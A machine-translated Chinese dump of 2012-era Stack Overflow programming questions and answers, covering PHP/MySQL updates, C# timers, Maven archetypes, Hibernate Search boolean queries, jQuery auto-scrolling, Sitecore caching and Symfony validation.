对于可以重复使用且更通用的东西，您可以创建一个包含激活 id 列表的激活组件。但是要激活特定类型的实体（例如用户注册或表单验证），您需要有一种在后端执行该操作的方法。例如，当您在`http://domain/activation/activate/id`内部调用时，会查找 id 并获取类型。当然，激活请求是在您的用户注册时创建的。您可能希望存储一些到期/超时，因为用户可能永远不会激活。

对于每种类型，您都可以在相关控制器上具有激活机制：`member/activate/key`或`formvalidation/activate/key`. 因此，当您的激活控制器收到激活请求时，它会根据类型配置一个路由列表，并导航到相关路由以执行“实际”激活。

另一种选择是让进程内组件执行激活，例如：一个由or`IActivator`实现的接口，然后有一个实现，它根据类型（.NET 类型或您提供的字符串类型）为您提供相关的提供者 --- 就这样给你）。`MemberActivator``FormValdationActivator``IActivatorProvider`

如果您愿意，您甚至可以将其传递`ActivationRequestCommand`给服务总线端点。

所以你有很多选择。高温高压

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T01:11:22.170

如果您是开发人员，我建议您至少尝试从代码开始......然后再次询问您是否遇到困难，提供您所做的示例。

您要做的基本上是使用发布到页面的临时 url 来完成注册......

# php - ID 列没有更新，而其他列正在更新？

> ID：10220164
> 
> 赞同：0
> 
> 时间：2012-04-19T00:48:20.623
> 
> 标签：php, mysql, html

再会。

这个小错误一直困扰着我，我似乎无法找到问题所在。有 3 列：id、last_name 和 first_name。后 2 次更新很好，但 id 列不断恢复到其原始值。

好的，这是我的一些代码片段：

```
while($row = mysql_fetch_array($result))
{

    echo "<tr>";  
    echo "<td><input type='checkbox' name ='doc_list[]' value =". $row ."></input></td>
          <td><input type='text' maxlength='9' id='id' name ='id' value =". $row['id'] ."></input></td> 
          <td><input type='text' maxlength='32' id='last_name' name ='last_name' value =". $row['last_name'] ."></input></td>
          <td><input type='text' maxlength='32' id='first_name' name ='first_name' value =". $row['first_name'] ."></input></td>
          <td><input type='submit' value='Update'/></td>
          <td><div id='message'></div></td>";

} 
```

然后当表单提交时：

```
//Extracts the information from the form
$id = clean($_POST['id']);
$first_name = clean($_POST['first_name']);
$last_name = clean($_POST['last_name']);

//Input validations
//include("../php/validate_insertion.php");

//Updates doctor info
$query1="UPDATE doctors 
     SET id= '$id', last_name='$last_name', first_name='$first_name'
     WHERE id='$id'";
$result = mysql_query($query1) or die(mysql_error()); 
```

错误在哪里？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-19T00:50:44.787

我并没有真正理解更改 ID 的逻辑，但问题是您没有保留原始 ID。您需要在`where`条件下更新原始记录，而不是恰好具有新 ID 的记录。

如果你真的想这样做（如果有重复的 id，你会遇到麻烦......），你应该将原始 ID 添加为隐藏字段，以便你知道要更新哪个记录。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-19T00:56:00.463

你为什么要改变 id 是我的第一个问题。

在任何情况下，如果您确实需要更改 id，则必须获取生成此表单的原始 id。这样做的一种方法是在表单中放置一个隐藏的输入字段，它可以为您提供生成此表单的 db 行的原始 ID。

PS：同样从安全的角度来看，从用户表单中接受 id 并不是一个好主意，这取决于您要更新该行。如果有人将该隐藏字段 id 更改为其他内容怎么办。

# javascript - 如何将 language_in 或 jscomp_off 与 Google Closure Compiler Service API 一起使用

> ID：10220166
> 
> 赞同：10
> 
> 时间：2012-04-19T00:48:39.950
> 
> 标签：javascript, google-closure-compiler

`--language_in=ECMASCRIPT5`是否有可能将命令行标志传递`--jscomp_off=internetExplorerChecks`给 Google Closure Compiler Service API？[我在Service API Reference](https://developers.google.com/closure/compiler/docs/api-ref)中找不到它。

作为参考，`jscomp_off`记录在[警告](http://code.google.com/p/closure-compiler/wiki/Warnings)中并`language_in`记录在[JavaScript](http://code.google.com/p/closure-compiler/wiki/JavaScript)中。

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-04-19T15:18:32.127

[https://github.com/google/closure-compiler/wiki/Additional-Webservice-Options](https://github.com/google/closure-compiler/wiki/Additional-Webservice-Options)

您可以使用“语言”作为网络服务选项。通过 UI 添加：

```
// @language ECMASCRIPT5 
```

到编译器配置注释块。

# c# - 股票代码生成的表格未正确显示

> ID：10220172
> 
> 赞同：2
> 
> 时间：2012-04-19T00:49:21.510
> 
> 标签：c#, forms, prompt, ticker

希望这不是太难遵循。

我目前正在开发一个在后台安静运行的小型时间记录应用程序。每次代码运行结束时，应用程序都会提示用户说出自上次提示以来他/她在做什么。我最终会让应用程序将数据写入电子表格。

到目前为止，我拥有的选项之一使用户能够选择他/她是否要使用默认提示设置（每次错过提示时，它都会保持可见，直到创建下一个提示，这意味着如果用户离开他/她的电脑有一段时间可能有相当多的提示坐在屏幕上等待填写）或想要合并所有提示（每次错过一个提示并弹出一个新提示时，旧的提示是关闭，新的覆盖旧提示和新提示的时间）。

用户还可以选择一个复选框来关闭提示。当他/她再次打开提示时，会弹出一个提示，要求用户填写他/她在关闭提示时所做的事情（当用户运行全屏应用程序等时很有用）。

我的问题是，当我尝试生成提示时，它们无法正确显示。我根本无法操纵它们，也没有任何控件显示。它们基本上看起来像空表格。

这是我使用代码生成提示的代码：

```
public void ticker(object source, System.Timers.ElapsedEventArgs e)
    {
        if (groupMissed)
        {
            incrementsMissed += 1;
            if (incrementsMissed > 1)
            {
                IncrementForm form = (IncrementForm)Application.OpenForms["IncrementForm"];
                if (form.InvokeRequired)
                {
                    form.Invoke(new MethodInvoker(delegate { form.Close(); }));
                }
            }
        }
        else
        {
            incrementsMissed = 1;
        }

        IncrementForm theIncrementForm = new IncrementForm(this, e.SignalTime);
        theIncrementForm.Show();
        latestIncrement = e.SignalTime;
    } 
```

这是我使用“关闭提示”复选框生成提示的代码：

```
private void chkbxAlerts_Click(object sender, EventArgs e)
    {
        if (!chkbxAlerts.Checked)
        {
            // Ensures that the time missed is covered and restarts the timer
            DateTime now;
            now = DateTime.Now;
            if ((now - latestIncrement).TotalMinutes >= 1) // Only records time if it is equal to or greater than one minute
            {
                // TO-DO: FIX
                if (groupMissed)
                {
                    incrementsMissed += 1;
                    if (incrementsMissed > 1)
                    {
                        IncrementForm form = (IncrementForm)Application.OpenForms["IncrementForm"];
                        if (form.InvokeRequired)
                        {
                            form.Invoke(new MethodInvoker(delegate { form.Close(); }));
                        }
                    }
                }
                else
                {
                    incrementsMissed = 1;
                }
                IncrementForm theIncrementForm = new IncrementForm(this, now, latestIncrement);
                theIncrementForm.Show();
                latestIncrement = now;
            }
            timer.Enabled = true;
        }
        else
        {
            // Stops the timer
            timer.Enabled = false;
        }
    } 
```

如果您需要任何进一步的说明，请告诉我。非常感谢您的帮助，这一直困扰着我。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-19T01:25:10.417

我认为，据我所见，不是 100%，而是您的计时器在一个单独的线程中生成您的窗口（来自计时器代码调用）。

虽然理论上可以工作（看看这个[如何在线程中打开表单并强制它保持打开状态](https://stackoverflow.com/questions/167323/how-to-open-a-form-in-a-thread-and-force-it-to-stay-open)）
......你最好留在主线程中。

尝试这样的事情......

```
yourMainWindow.Invoke(new MethodInvoker(() =>
    {
        IncrementForm theIncrementForm = new IncrementForm(this, e.SignalTime);
        theIncrementForm.Show();
        latestIncrement = e.SignalTime;
    })); 
```

...那是你的计时器 - 这样（如我所见）你应该把它全部放在“主线程”上，让事情变得更容易。

希望这可以帮助

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-19T01:38:18.823

`System.Timers.Timer`有一个[SynchronizingObject](http://msdn.microsoft.com/en-us/library/system.timers.timer.synchronizingobject.aspx)属性。如果将其设置为主窗体（或包含计时器的窗体），则将在 GUI 线程上引发计时器滴答事件。

请注意，`System.Timers.Timer`有吞下`Elapsed`事件中发生的异常的讨厌习惯。如果您的刻度处理程序抛出异常，您将永远不会看到它。这是一个讨厌的虫子隐藏器。出于这个原因，我建议使用`System.Windows.Forms.Timer`或`System.Threading.Timer`。如果您使用 Windows 窗体计时器，则在 GUI 线程上引发 elapsed 事件。如果您使用`System.Threading.Timer`，则必须使用`Invoke`NSGaga 在他的回答中显示的内容。

有关我为什么不[鼓励](http://blog.mischel.com/2011/05/19/swallowing-exceptions-is-hiding-bugs/)使用`System.Timers.Timer`.

# maven - Maven原型创建：原型pom

> ID：10220175
> 
> 赞同：4
> 
> 时间：2012-04-19T00:50:36.800
> 
> 标签：maven, maven-archetype

我正在创建一个 Maven 原型。在这个我有一个原型项目，当用户调用以下命令时，它会为用户创建：

mvn archetype:generate -DarchetypeGroupId=xxx -DarchetypeArtifactId=archtype-yyyy -DarchetypeVersion=1.1.0-S5-SNAPSHOT -DgroupId=zzz -DartifactId=proj11

在原型 pom 中，我想使用我在上述命令中指定的“archetypeVersion”属性。像这样：

```
<dependencies>
    <dependency>
        <groupId>mmmm</groupId>
        <artifactId>nte</artifactId>
        <version>${archetypeVersion}</version>
    </dependency> 
```

这对我不起作用。创建项目时，它仍然会在生成的 pom 中显示与上面发布的完全一样的依赖项片段。它不会取代它。

这可能吗？maven允许这样做吗？如果是，我该怎么做？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-06T15:46:30.500

我认为简单的方法是使用 maven-replacer-plugin。您必须将下一部分添加到原型 /pom.xml：

```
<build>
    ...
    <plugins>
        <plugin>
            <groupId>com.google.code.maven-replacer-plugin</groupId>
            <artifactId>replacer</artifactId>
            <version>1.5.2</version>
            <executions>
                <execution>
                    <phase>prepare-package</phase>
                    <goals><goal>replace</goal></goals> 
                </execution>
            </executions>
            <configuration>
                <file>target/classes/archetype-resources/pom.xml</file>
                <replacements>
                    <replacement>
                        <token>\$\{archetypeVersion\}</token>
                        <value>${version}</value>
                    </replacement> 
                </replacements>
            </configuration>
        </plugin>
    </plugins>
    ...
<build> 
```

即此代码将“${archetypeVersion}”子字符串替换为当前版本的原型。您的 '/src/main/resources/archetype-resources/pom.xml' 包含下一个依赖项：

```
<dependency>
    <groupId>xxxx</groupId>
    <artifactId>yyyy</artifactId>
    <version>${archetypeVersion}</version>
</dependency> 
```

执行“mvn install”命令后，生成的文件“/target/classes/archetype-resources/pom.xml”将包含原型版本号。现在你已经安装了原型并且可以使用它：'mvn archetype:generate ...'。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2021-06-22T16:45:21.650

我发现的最简单的方法是将其添加为默认变量，`META-INF/maven/archetype-metadata.xml`如下所示：

```
<archetype-descriptor
    xmlns="https://maven.apache.org/plugins/maven-archetype-plugin/archetype-descriptor/1.1.0"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="https://maven.apache.org/plugins/maven-archetype-plugin/archetype-descriptor/1.1.0 http://maven.apache.org/xsd/archetype-descriptor-1.1.0.xsd"
    name="archetypeVersionExample">

    <requiredProperties>
        ...
        <requiredProperty key="archetypeVersion">
            <defaultValue>${version}</defaultValue>
        </requiredProperty>
    </requiredProperties>
    ...

</archetype-descriptor> 
```

无需额外的插件或用户输入。

# java - 如何将从 TextField 视图获取的字符串转换为 int

> ID：10220179
> 
> 赞同：0
> 
> 时间：2012-04-19T00:51:22.303
> 
> 标签：java, android, string, int

我有`TextField`一个布局，我想检索它并将其转换为整数以将其放入我的数据库中。我使用了以下代码，但它一直给我一些异常

```
EditText agefield = (EditText) findViewById(R.id.agefield);             
int age = Integer.parseInt(agefield.getText().toString()); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-19T00:55:26.423

如果 Java 这一行

```
int age = Integer.parseInt(agefield.getText().toString()); 
```

可以重写为

```
int age = Integer.parseInt(agefield.getText()); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T09:18:14.873

嗨，在 android 中实现这一点；您的确切问题已在[此处](https://stackoverflow.com/questions/4197356/android-edittext-value-to-integer "将android edittext值转换为整数")得到解答。

此外，我会建议您仔细检查以验证您是否已为相关活动调用 setContentView(R.layout.main)，即确保在尝试调用 EditText agefield = 之前已将包含 agefield edittext 的 xml 文件设置为 contentview (EditText) findViewById(R.id.agefield)。如果没有，那么您将获得一个空指针，因为您的 edittext 字段将为空。确认后确保edittext中的值是有效数字且不为空。

我认为 setContentView 是问题所在，因为我最近有类似的经历。

如果这回答了您的问题，请随意标记为答案。希望这有帮助，祝你好运！

# java - 如何在 Hibernate Search 中使用布尔运算符

> ID：10220184
> 
> 赞同：8
> 
> 时间：2012-04-19T00:51:52.693
> 
> 标签：java, hibernate-search

我正在学习[Hibernate Search Query DSL](http://docs.jboss.org/hibernate/search/4.1/reference/en-US/html/search-query.html#search-query-querydsl)，但我不确定如何使用 AND 或 OR 等布尔参数构造查询。

例如，假设我要返回`firstName`值为“bill”或“bob”的所有人员记录。

在 hibernate 文档之后，一个示例使用带有两个子查询的 bool() 方法，例如：

```
QueryBuilder b = fts.getSearchFactory().buildQueryBuilder().forEntity(Person.class).get();
Query luceneQuery = b.bool()
    .should(b.keyword().onField("firstName").matching("bill").createQuery())
    .should(b.keyword().onField("firstName").matching("bob").createQuery())
    .createQuery();

logger.debug("query 1:{}", luceneQuery.toString()); 
```

这最终会产生我想要的 lucene 查询，但这是在休眠搜索中使用布尔逻辑的正确方法吗？“should()”是否等同于“OR”（类似地，“must()”是否对应于“AND”）？

此外，以这种方式编写查询感觉很麻烦。例如，如果我有一组要匹配的名字怎么办？这种类型的查询首先是否适合 DSL？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-25T19:54:31.033

是的，你的例子是正确的。布尔运算符被称为*should*而不是*OR*，因为它们在 Lucene API 和文档中具有名称，并且因为它更合适：它不仅影响布尔决策，而且还影响结果的评分。

例如，如果您搜索“菲亚特品牌”或“蓝色”的汽车，菲亚特和蓝色品牌的汽车也将被返回，并且得分高于蓝色但不是菲亚特的汽车。

它可能会让人觉得很麻烦，因为它是程序化的并且提供了许多详细的选项。一个更简单的替代方法是为您的查询使用一个简单的字符串并使用*QueryParser*创建查询。一般来说，解析器对解析用户输入很有用，程序化的更容易处理定义好的字段；例如，如果您有您提到的集合，则很容易在*for*循环中构建它。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2015-03-10T06:30:33.560

您也可以使用[BooleanQuery](http://www.avajava.com/tutorials/lessons/how-do-i-combine-queries-with-a-boolean-query.html "布尔查询")。我更喜欢这个，因为您可以在列表的循环中使用它。

```
 org.hibernate.search.FullTextQuery hibque = null; 

    org.apache.lucene.search.BooleanQuery bquery = new BooleanQuery();

    QueryBuilder qb = fulltextsession.getSearchFactory().buildQueryBuilder()
              .forEntity(entity.getClass()).get();
    for (String keyword : list) {
        bquery.add(qb.keyword().wildcard().onField(entityColumn).matching(keyword)
              .createQuery()  , BooleanClause.Occur.SHOULD);
    }

    if (!filterColumn.equals("") && !filterValue.equals("")) {
       bquery.add(qb.keyword().wildcard().onField(column).matching(value).createQuery()
                        , BooleanClause.Occur.MUST);
    } 

    hibque = fulltextsession.createFullTextQuery(bquery, entity.getClass());

    int num = hibque.getResultSize(); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-24T08:09:16.667

回答你的第二个问题：

> 例如，如果我有一组要匹配的名字怎么办？

我不是专家，但根据（最后的第三个例子）**5.1.2.1。**[Hibernate Search Documentation](http://docs.jboss.org/hibernate/search/4.1/reference/en-US/html_single/#search-query-querydsl)中的**关键字查询**，您应该能够像这样构建查询：

```
Collection<String> namesCollection = getNames(); // Contains "billy" and "bob", for example
StringBuilder names = new StringBuilder(100);
for(String name : namesCollection) {
    names.append(name).append(" "); // Never mind the space at the end of the resulting string.
}

QueryBuilder b = fts.getSearchFactory().buildQueryBuilder().forEntity(Person.class).get();
Query luceneQuery = b.bool()
    .should(
        // Searches for multiple possible values in the same field
        b.keyword().onField("firstName").matching( sb.toString() ).createQuery()
    )
    .must(b.keyword().onField("lastName").matching("thornton").createQuery())
    .createQuery(); 
```

并且，因此，`Person`s 与（`firstName` *最好*是“比利”或“鲍勃”）和（`lastName`=“桑顿”），虽然我不认为它会给好人比利鲍勃桑顿更高的分数 ;-)。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2016-11-07T17:10:22.890

我一直在寻找相同的问题，但遇到的问题与提出的问题有所不同。我在寻找一个真正的`OR`交界处。should case 对我不起作用，因为结果没有通过两个表达式中的任何一个，但分数较低。我想完全忽略这些结果。但是，您可以使用禁用评分的单独布尔表达式创建实际的布尔 OR 表达式：

```
val booleanQuery = cb.bool();
val packSizeSubQuery = cb.bool();

packSizes.stream().map(packSize -> cb.phrase()
     .onField(LUCENE_FIELD_PACK_SIZES)
     .sentence(packSize.name())
     .createQuery())
     .forEach(packSizeSubQuery::should);

booleanQuery.must(packSizeSubQuery.createQuery()).disableScoring();
fullTextEntityManager.createFullTextQuery(booleanQuery.createQuery(), Product.class)
return persistenceQuery.getResultList(); 
```

# emacs - 比较elisp中的两个数字列表？

> ID：10220185
> 
> 赞同：4
> 
> 时间：2012-04-19T00:52:00.650
> 
> 标签：emacs, elisp

所以，我可以这样做（使用 cl）：

```
(loop for x in my-list
      for y in my-other-list
      if (> x y) return t
      if (< x y) return nil) 
```

但是我真的觉得这应该像`(list> my-list my-other-list)`但是我绝对找不到任何证据表明这个函数以任何名称存在。事实上，我什至根本找不到任何用于比较列表*的*通用文档。这让我觉得我一定错过了什么。

我是否确实定义`(list>)`了自己，或者我在匆忙和困惑中错过了大量的文档？

如果我必须自己定义，你能做得更好吗？我不是一个真正的 elisp 黑客。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-19T01:23:26.710

这个怎么样：

```
(require 'cl)
(every '> my-list my-other-list) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-21T03:04:11.063

Elisp 提供的最接近的可能是`version-list-<`.

# ms-access - 使用 Visual Basic 在 Microsoft Access 数据库中保存和加载 jpg 文件

> ID：10220186
> 
> 赞同：3
> 
> 时间：2012-04-19T00:52:04.410
> 
> 标签：ms-access, vba, file-upload, jpeg

我是学习 Visual Basic 和 Microsoft Access 的初学者。我可以知道如何连接这两者以及如何创建一个在数据库中保存和加载 JPG 图像的按钮吗？非常感谢。

# javascript - 浏览器打开时加载

> ID：10220190
> 
> 赞同：0
> 
> 时间：2012-04-19T00:52:18.193
> 
> 标签：javascript, jquery, firefox, toolbar, add-on

我做了一个特殊的按钮，通过使用这个js显示使用api的服务器状态，我的问题是我不能让这个东西在你第一次打开浏览器时自动加载，你必须实际点击按钮，否则它不会开始运行。

```
function checkStatus(event)
{
    jQuery.getJSON("url",function(data){ 
        var button = document.getElementById("ServStat");
        if ( data.status == '1') { 
            jQuery('#ServStat').addClass('online').removeClass('offline');
            button.label = 'Online'; }
        else { 
            jQuery('#ServStat').addClass('offline').removeClass('online');
            button.label = 'Offline' 
        }
    });
} 
```

欢迎任何想法，并提前致谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-19T00:53:52.790

只需将代码添加到 document.ready 函数即可。它在文档完全加载后执行。

所以你的代码会变成这样，

```
$(document).ready(function () {
    jQuery.getJSON("url", function (data) {
        var button = document.getElementById("ServStat");
        if (data.status == '1') {
            jQuery('#ServStat').addClass('online').removeClass('offline');
            button.label = 'Online';
        } else {
            jQuery('#ServStat').addClass('offline').removeClass('online');
            button.label = 'Offline'
        }
    });
}); 
```

您可以在此处获取更多详细信息：http: [//api.jquery.com/ready/](http://api.jquery.com/ready/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-19T00:54:22.340

```
$(function() {
  checkStatus();
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-19T23:08:47.603

感谢大家，我真的很感谢您花时间和精力回答我的问题，我是该网站的“新手”，让我告诉您，在这第一印象之后，我会长期在这里:)。

关于这个问题，你们中的大多数人都注意到我从实践中学习并且我并没有真正深入了解，我尝试尽可能多地关注并阅读我发现的所有内容，无论如何，我的朋友确实有对此的深刻理解注意到，在我的 xul 文件中，脚本是这样设置的：

```
<script type="application/x-javascript" src="chrome://neverendlessbar/content/serverstatus.js" />
<script type="application/x-javascript" src="chrome://neverendlessbar/content/jquery-1.7.2.js" />
<script type="text/javascript">
    $.noConflict();
</script> 
```

当正确的方法是：

```
<script type="application/x-javascript" src="chrome://neverendlessbar/content/jquery-1.7.2.js" />
<script type="text/javascript">
    $.noConflict();
</script>
<script type="application/x-javascript" src="chrome://neverendlessbar/content/serverstatus.js" /> 
```

jQuery 没有正确加载。在我们修复了 jQuery 错误之后，我们只添加了一个简单的“checkStatus();” 到代码的结尾，我们可以这样做：

```
function checkStatus(event)
{
    jQuery.getJSON("url",function(data){ 
    var button = document.getElementById("ServStat");
    if ( data.status == '1') { 
    jQuery('#ServStat').addClass('online').removeClass('offline').attr('label','Online');}
    else { 
    jQuery('#ServStat').addClass('offline').removeClass('online').attr('label','Offline');}});
}
checkStatus(); 
```

在第一次运行中工作：D。

所以再次感谢大家，我希望有一天我能回报你的青睐：D。

> 在阅读了 epascarello 的回复后，我问，确实“getElementById”不是必需的。

最终代码

```
function checkStatus()
{
    jQuery.getJSON("url",function(data){ 
    if ( data.status == '1')     {jQuery('#ServStat').addClass('online').removeClass('offline').attr('label','Online');}
    else     {jQuery('#ServStat').addClass('offline').removeClass('online').attr('label','Offline');}});
}
checkStatus();
{
    setInterval(changeState, 300000)
} 
```

# wix - 带有 Wix 的自定义安装程序

> ID：10220192
> 
> 赞同：0
> 
> 时间：2012-04-19T00:52:33.897
> 
> 标签：wix, windows-installer

我对 Wix 还是很陌生，所以我试图弄清楚它是如何工作的。它有很多内容，而且有点难以理解。如果我的 Wix MSI 包含一堆补丁文件。我可以使用自定义操作将文件提取到临时位置，运行补丁程序，使用补丁文件版本更新版本，然后运行任何其他 MSI 操作吗？

我不确定如何在 XML 中执行此操作。我假设有某种执行顺序

此外，如果可能的话，我需要一种在构建期间将补丁文件动态添加到 MSI 的方法。您可以将其基于输出文件夹吗？

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-04-19T01:00:05.750

WiX 比 installshield 之类的要好得多，但是如果没有看到您现有的 .wixproj，这很难直接回答。您可以使用自定义操作来完成您想要的所有操作，但这并不完全是“WiX 方式”，因为回滚或卸载不容易逆转。在构建期间动态添加文件是绝对可能的。我必须绝对引导您阅读 Ramirez 的 WiX：Windows Installer XML 开发人员指南。我在构建这样一个复杂的安装程序时遇到了困难，而这本书非常宝贵。

我可以轻松地说，对于补丁部分，您可以运行 exec 任务来运行补丁程序并传递您要运行的补丁文件。您可以将所有这些转储到一个临时目录来执行此操作。

# jquery - jquery：如何循环一个div

> ID：10220195
> 
> 赞同：3
> 
> 时间：2012-04-19T00:52:57.530
> 
> 标签：jquery, loops, slider, autoscroll

使用 jquery，如何连续自动滚动 div？喜欢本网站的新闻和专题部分：http: [//animalsasia.org/](http://animalsasia.org/)。而且，当您将鼠标悬停在滑块上时，它会停止滚动，直到您将鼠标悬停。

有没有一个jQuery插件可以做到这一点？任何帮助将非常感激。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-04-19T01:37:54.157

我写了一些工作示例。JsFiddle 上有[现场示例](http://jsfiddle.net/x47Te/3/)。这个想法是创建位置=相对的容器，并将带有文本的 div 放入其中。此外，我们需要创建文本的副本以避免在显示文本的最后部分时出现空白。jQuery animate() 函数将完成剩下的工作。

HTML：

```
<div class="news_container">
    <div class="news">
       <div class="text">
           Long text
        </div>   
    </div>
</div> 
```

CSS：

```
.news_container {
  border: 1px solid black;
  width:150px;
  height: 300px;   
  overflow: hidden;
  position: relative;
  padding: 3px;
}

.news {
  position: absolute; 
  left: 0px;
  top: 0px;
} 
```

JavaScript：

```
(function($, undefined) {
  $.fn.loopScroll = function(p_options) {
    var options = $.extend({
        direction: "upwards",
        speed: 60
    }, p_options);

    return this.each(function() {
      var obj = $(this).find(".news");
      var text_height = obj.find(".text").height();
      var start_y, end_y;
      if (options.direction == "downwards") {
        start_y = -text_height;
        end_y = 0;
      } else if (options.direction == "upwards") {
        start_y = 0;
        end_y = -text_height;
      }

      var animate = function() {
        // setup animation of specified block "obj"
        // calculate distance of animation    
        var distance = Math.abs(end_y - parseInt(obj.css("top")));

        //duration will be distance / speed
        obj.animate(
          { top: end_y },  //scroll upwards
          1000 * distance / options.speed,
          "linear",
          function() {
            // scroll to start position
            obj.css("top", start_y);
            animate();    
          }
        );
      };

      obj.find(".text").clone().appendTo(obj);
      $(this).on("mouseover", function() {
        obj.stop();
      }).on("mouseout", function() {
        animate(); // resume animation
      });
      obj.css("top", start_y);
      animate(); // start animation       
    });
  };
}(jQuery));

$(".news_container").loopScroll(); 
```

选项：

*   `direction`（“向下”或“向上”） - 文本移动的方向；
*   `speed`- 移动速度。

以下是使用此插件和选项的示例：

```
$("#example3").loopScroll();
$("#example4").loopScroll({ speed: 120 });
$("#example1").loopScroll({ direction: "downwards" });
$("#example2").loopScroll({ direction: "downwards", speed: 30 }); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-19T01:07:17.167

看起来像一组绝对定位在容器内的 DIV。他们可能使用 setInterval 计时器`top`每隔几毫秒将每个 DIV 的位置修改一个固定量。一旦 DIV 完全滚动到顶部（顶部位置是 DIV 高度的负数），它们可能会将其重新定位到堆栈的底部。有足够的 DIV 来填充整个容器加上一些，给人一种连续滚动的错觉，因为你看不到它们从顶部弹出并回到底部。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-19T01:08:07.663

如果您检查元素，您可以看到它正在改变`top`元素的位置。

当列表开始时，项目 1 在容器的边界内。

```
------
item 1
item 2
item 3
------
item 4 
```

随着代码的进展，它将项目 1 移动到容器边界之外

```
item 1
-----
item 2
item 3
item 4
------ 
```

当项目 1 移出边界时，它会将其移动到容器的底部并继续向上移动其他项目

```
-----
item 2
item 3
item 4
-----
item 1 
```

自己实现相当简单，但是[jquery vticker](http://www.jugbit.com/jquery-vticker-vertical-news-ticker/)应该包含您想要的功能。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-19T01:07:07.890

您可以使用 marquee html 标记（非标准，但几乎可以在任何地方使用），或者查看这个 jquery 插件：

[http://remysharp.com/2008/09/10/the-silky-smooth-marquee/](http://remysharp.com/2008/09/10/the-silky-smooth-marquee/)

# caching - 以编程方式从缓存中清除项目的 Sitecore 缓存

> ID：10220196
> 
> 赞同：5
> 
> 时间：2012-04-19T00:53:16.253
> 
> 标签：caching, sitecore

我想以编程方式清除项目的 Sitecore 缓存。我运行了下面的代码。之后，我尝试对已删除的 id 执行 web.GetItem ，但仍然得到空值。有什么建议么？

```
Database db = new Database("web");

        if (ID.IsID(id))
        {
            ID itemID = new ID(id);
            //clear data cache
            db.Caches.DataCache.RemoveItemInformation(itemID);

            //clear item cache
            db.Caches.ItemCache.RemoveItem(itemID);

            //clear standard values cache
            db.Caches.StandardValuesCache.RemoveKeysContaining(itemID.ToString());

            //remove path cache
            db.Caches.PathCache.RemoveKeysContaining(itemID.ToString());
        } 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-19T07:14:16.690

看起来你错过了预取缓存，这里是如何获取它：

```
private Cache GetPrefetchCache(Database database)
    {
        foreach (var cache in global::Sitecore.Caching.CacheManager.GetAllCaches())
        {
            if (cache.Name.Contains(string.Format("Prefetch data({0})", database.Name)))
            {
                return cache;
            }
        } 
```

并且 html 缓存也：

```
private void ClearAllHtmlCaches() 
{
     foreach (var info in Factory.GetSiteInfoList())
     {
         info.HtmlCache.Clear();
     }
} 
```

# php - 从 Symfony 自定义验证器中抛出全局错误的优雅方法？

> ID：10220205
> 
> 赞同：0
> 
> 时间：2012-04-19T00:54:04.473
> 
> 标签：php, forms, symfony1, validation

我正在使用 Symfony 1.4 允许用户导入各种类型的 CSV 文件，并且我决定将上传文件的实际内容的验证和清理合并到自定义验证器中 - 自定义验证器将扩展 sfValidatorFile。

此外，当文件包含错误时，我想在表单上抛出全局错误，而不是将它们显示为字段/本地错误 - 并且 - 能够同时显示给定导入文件的许多验证错误。

我很确定我可以通过使用 Post Validator 来完成这项工作，但这似乎不太适合 Post Validator（因为我真的只需要了解一个表单字段来执行我的自定义验证），但更重要的是，我想要更优雅的东西，将所有额外的验证工作打包到一个自定义文件验证器中。

例如，而不是：

```
$this->validatorSchema['file'] = new sfValidatorFile( … );
$this->validatorSchema->setPostValidator(new myFancyValidator( … )); 
```

我只想做类似的事情：

```
$this->validatorSchema['file'] = new myFancyValidator( … ); 
```

...并将 myFancyValidator 中遇到的验证错误添加到表单的全局错误集合中。

我已经尝试了几种不同的方法来从我的自定义验证器中将错误推送到表单的 globalErrors 上，但是我错过了一些关于验证难题的各个部分如何组合/范围的信息。关于如何做到这一点的任何想法？依赖注入？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T13:34:47.623

在您的自定义验证器中抛出一个 sfValidatorError 对象，例如：

```
if(!$isValid){
    // throw global error
    throw new sfValidatorError($this, "invalid");
}
else {
    return true;
} 
```

# symfony - 数据库中的翻译和 Symfony2

> ID：10220206
> 
> 赞同：8
> 
> 时间：2012-04-19T00:54:05.720
> 
> 标签：symfony, translation

基于文件的翻译对我不起作用，因为客户需要更改文本。

所以我正在考虑实现[这个接口](http://api.symfony.com/2.3/Symfony/Component/Translation/Loader/LoaderInterface.html)来从数据库中获取数据并将结果缓存在 APC 缓存中。这是一个好的解决方案吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-30T19:36:19.980

这可能是您正在寻找的：

[在 Symfony 2 中使用数据库作为翻译提供者](https://web.archive.org/web/20160619063201/http://blog.elendev.com:80/development/php/symfony/use-a-database-as-translation-provider-in-symfony-2/)

> ## 介绍
> 
> 这篇文章解释了如何在 Symfony 2 中使用数据库作为翻译存储。使用数据库提供翻译在 Symfony 2 中很容易做到，但不幸的是，它实际上并没有在 Symfony 2 网站上解释。
> 
> ## 创建语言实体
> 
